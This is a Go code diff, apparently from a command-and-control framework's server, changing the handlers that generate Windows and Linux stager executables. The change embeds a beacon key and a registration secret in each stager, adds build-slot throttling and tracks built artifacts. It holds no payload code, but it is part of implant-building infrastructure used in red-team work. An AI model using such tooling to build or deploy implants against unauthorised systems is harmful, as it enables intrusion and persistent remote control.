@@ -122,18 +122,26 @@ func (s *Server) generateTokenStager(goos string, form *stagerGenerateForm) (str
 	}
 
 	// Build the full beacon (stage-2) for the target OS.
+	beaconKey := s.serverBeaconKey()
+	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey)
+	if err != nil {
+		return "", fmt.Errorf("create v3 registration secret: %w", err)
+	}
 	stagerCfg := payload.StagerConfig{
-		ListenerID:   form.ListenerID,
-		C2URL:        form.C2URL,
-		Protocol:     proto,
-		Architecture: form.Architecture,
-		OS:           goos,
-		Format:       "exe",
-		UserAgent:    form.UserAgent,
-		Profile:      form.Profile,
+		ListenerID:    form.ListenerID,
+		C2URL:         form.C2URL,
+		Protocol:      proto,
+		Architecture:  form.Architecture,
+		OS:            goos,
+		Format:        "exe",
+		UserAgent:     form.UserAgent,
+		Profile:       form.Profile,
 		SkipTLSVerify: form.SkipTLSVerify,
-		DNSDomain:    form.DNSDomain,
-		DNSServer:    form.DNSServer,
+		DNSDomain:     form.DNSDomain,
+		DNSServer:     form.DNSServer,
+		BeaconKey:     beaconKey,
+		RegSecretID:   regSecretID,
+		RegSecret:     regSecretB64,
 	}
 	var stagePath string
 	if strings.EqualFold(goos, "linux") {
@@ -201,7 +209,9 @@ func (s *Server) handleGenerateStager(c *gin.Context) {
 		return
 	}
 
-	stagerPath, err := s.generateTokenStager("windows", form)
+	stagerPath, err := s.withBuildSlot(func() (string, error) {
+		return s.generateTokenStager("windows", form)
+	})
 	if err != nil {
 		s.logStagerBuild("windows", form, "failed", err.Error())
 		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Stager generation"))
@@ -209,6 +219,7 @@ func (s *Server) handleGenerateStager(c *gin.Context) {
 	}
 
 	s.logStagerBuild("windows", form, "success", stagerPath)
+	s.registerTransientArtifact(stagerPath)
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
 	serveFileSafe(c, stagerPath, agentsDir, filepath.Base(stagerPath))
 }
@@ -220,7 +231,9 @@ func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
 		return
 	}
 
-	stagerPath, err := s.generateTokenStager("linux", form)
+	stagerPath, err := s.withBuildSlot(func() (string, error) {
+		return s.generateTokenStager("linux", form)
+	})
 	if err != nil {
 		s.logStagerBuild("linux", form, "failed", err.Error())
 		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Stager generation"))
@@ -228,6 +241,7 @@ func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
 	}
 
 	s.logStagerBuild("linux", form, "success", stagerPath)
+	s.registerTransientArtifact(stagerPath)
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
 	serveFileSafe(c, stagerPath, agentsDir, filepath.Base(stagerPath))
 }
